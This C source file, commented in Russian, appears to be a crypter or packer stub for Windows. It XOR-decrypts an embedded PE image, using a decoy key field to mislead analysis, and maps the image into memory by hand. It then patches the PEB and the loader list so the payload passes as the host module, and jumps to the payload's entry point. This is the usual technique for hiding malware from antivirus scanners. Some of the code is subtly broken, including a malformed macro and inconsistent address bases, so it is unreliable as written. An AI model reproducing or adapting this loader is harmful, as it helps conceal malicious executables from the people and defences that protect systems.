#include <windows.h>
#include "ntdll.h"



#define unsigned int u_int;
// макросы
#define MAKE_PTR(cast, base, offset) (cast)((DWORD_PTR)(base) + (DWORD_PTR)(offset))
// макрос смены смешения начала в памяти
#define RVATOVA( base, offset )(((DWORD)(base) + (DWORD)(offset))) 
#define XOR(X,Y) ((~(X)&(Y))|((X)&(~(Y))))

HMODULE
Load(
IN LPBYTE image,
OUT DWORD* addr
)
{
	// поиск заголовков PE файла
	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)image;
	PIMAGE_NT_HEADERS nt = MAKE_PTR(PIMAGE_NT_HEADERS, image, dos_header->e_lfanew);
	PIMAGE_FILE_HEADER pfh = &nt->FileHeader;
	PIMAGE_SECTION_HEADER psh = IMAGE_FIRST_SECTION(nt);
	PIMAGE_OPTIONAL_HEADER32 poh = &nt->OptionalHeader;

	// указатель на  точку входа 
	*addr = poh->AddressOfEntryPoint;

	//указатель на начало образа программы в памяти
	LPVOID base = (PVOID)poh->ImageBase;

	// выделение памяти под разметку образа в памяти
	LPBYTE mapping = (LPBYTE)VirtualAlloc(base, poh->SizeOfImage, MEM_RESERVE, PAGE_NOACCESS);
	if (!mapping) return NULL;
	mapping = (LPBYTE)VirtualAlloc(base, 0x1000, MEM_COMMIT, PAGE_READWRITE);
	if (!mapping) return NULL;
	memcpy(mapping, image, 0x1000);

	// проецирование секций в память
	for (u_int i = 0; i < pfh->NumberOfSections; i++, psh++)
	{
		DWORD VirtualSize = (i == pfh->NumberOfSections - 1) ?
			(poh->SizeOfImage - psh->VirtualAddress)
			: (psh + 1)->VirtualAddress - psh->VirtualAddress;
		LPVOID va = (LPVOID)(mapping + psh->VirtualAddress);
		LPVOID m = VirtualAlloc(va, VirtualSize, MEM_COMMIT, PAGE_READWRITE);
		if (m != va) return NULL;
		memcpy(va, (LPVOID)&image[psh->PointerToRawData], psh->SizeOfRawData);
	}

	// Разбор таблицы импорта
	PIMAGE_IMPORT_DESCRIPTOR impdesc = (PIMAGE_IMPORT_DESCRIPTOR)RVATOVA
		(poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress, mapping);

	for (; impdesc->Characteristics; impdesc++)
	{
		char* dllname = (LPTSTR)RVATOVA(impdesc->Name, mapping);
		HMODULE hDll = (HMODULE)LoadLibraryA(dllname);
		if (!hDll) return NULL;
		DWORD RvaOfThunks = impdesc->FirstThunk;

		// получение функций из таблицы OriginalThunk и замена ими значений таблицы Thunk
		if (impdesc->TimeDateStamp == -1)
		{
			PDWORD Func;
			PIMAGE_THUNK_DATA OriginalThunk = (PIMAGE_THUNK_DATA)RVATOVA(impdesc->OriginalFirstThunk, mapping);
			PIMAGE_THUNK_DATA Thunk = (PIMAGE_THUNK_DATA)RVATOVA(impdesc->FirstThunk, mapping);
			if (OriginalThunk->u1.Ordinal & 0xf0000000)
			{
				OriginalThunk->u1.Ordinal &= 0xffff;
				Func = (PDWORD)GetProcAddress(hDll, (char*)OriginalThunk->u1.Ordinal);
			}
			else
			{
				PIMAGE_IMPORT_BY_NAME Name = (PIMAGE_IMPORT_BY_NAME)RVATOVA(OriginalThunk->u1.AddressOfData, base);
				Func = (PDWORD)GetProcAddress(hDll, (char*)Name->Name);
			}
			if (Thunk->u1.Function == (DWORD)Func) continue;
			else RvaOfThunks = impdesc->OriginalFirstThunk;
		}

		// добавление загруженных функции к размеченой программе
		for (PIMAGE_THUNK_DATA Thunk = (PIMAGE_THUNK_DATA)RVATOVA(RvaOfThunks, mapping); Thunk->u1.Ordinal; Thunk++)
		{
			if (Thunk->u1.Ordinal & 0xf0000000)
			{
				Thunk->u1.Ordinal &= 0xffff;
				Thunk->u1.Function = (DWORD)GetProcAddress(hDll, (char*)Thunk->u1.Ordinal);
				if (!Thunk->u1.Function) return NULL;
			}
			else
			{
				PIMAGE_IMPORT_BY_NAME Name = (PIMAGE_IMPORT_BY_NAME)RVATOVA(Thunk->u1.AddressOfData, base);
				Thunk->u1.Function = (DWORD)GetProcAddress(hDll, (char*)Name->Name);
			}
			PIMAGE_THUNK_DATA ThunkToWrite;
			ThunkToWrite = (PIMAGE_THUNK_DATA)((DWORD)RVATOVA(impdesc->FirstThunk, mapping) + 
				((DWORD)Thunk - (DWORD)RVATOVA(RvaOfThunks, mapping)));
			ThunkToWrite->u1.Function = Thunk->u1.Function;
		}
	}

	// вычисление виртуального размера программы в памяти
	psh = (PIMAGE_SECTION_HEADER)((DWORD)poh + sizeof(IMAGE_OPTIONAL_HEADER));
	for (u_int i = 0; i < pfh->NumberOfSections; i++, psh++)
	{
		DWORD VirtualSize = (i == pfh->NumberOfSections - 1) ? 
			(poh->SizeOfImage - psh->VirtualAddress) : 
			(psh + 1)->VirtualAddress - psh->VirtualAddress;
		LPVOID va = (LPVOID)(mapping + psh->VirtualAddress);
		DWORD Attributes = PAGE_READWRITE;
		if (psh->Characteristics & IMAGE_SCN_MEM_EXECUTE || psh->Characteristics & IMAGE_SCN_MEM_READ)
		{
			if (psh->Characteristics & IMAGE_SCN_MEM_WRITE) Attributes = PAGE_EXECUTE_READWRITE;
			else Attributes = PAGE_EXECUTE_READ;
		}
		if (!VirtualProtect(va, VirtualSize, Attributes, &Attributes)) return NULL;
	}
	return (HMODULE)mapping;
}

// функции генерирования ключей
inline DWORD generator(DWORD size)
{
	return (size >> 1) & size;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	LPBYTE crypted_image = (LPBYTE)0xDEADBEEF;
	DWORD crypted_image_size = 0xBEEFCACE;

	// ложное поле с ключом
	DWORD key = 0xD408CA6E;
	DWORD dwImageTempSize = crypted_image_size;

	// выделение памяти под распакованый образ
	LPBYTE p_image = new BYTE[crypted_image_size];
	memcpy(p_image, crypted_image, crypted_image_size);

	// дешифровка образа 
	for (u_int i = 0; i < crypted_image_size; i++)
	{
		p_image[i] = XOR(p_image[i] , generator(i));
	}

	DWORD AddressOfEntryPoint;
	HMODULE h_module = Load(p_image, &AddressOfEntryPoint);

	// запуск PE-образа
	if (h_module)
	{
		PPEB Peb;
		__asm 
		{
			push eax
			mov eax, FS:[0x30];
			mov Peb, eax
			pop eax
		}
		Peb->ImageBaseAddress = h_module;

		PLDR_DATA_TABLE_ENTRY pLdrEntry = (PLDR_DATA_TABLE_ENTRY)(Peb->Ldr->ModuleListLoadOrder.Flink);
		pLdrEntry->DllBase = h_module;

		LPVOID entry = (LPVOID)((DWORD)h_module + AddressOfEntryPoint);
		
		// вызов точки входа
		__asm call entry;
	}

	return 0;
}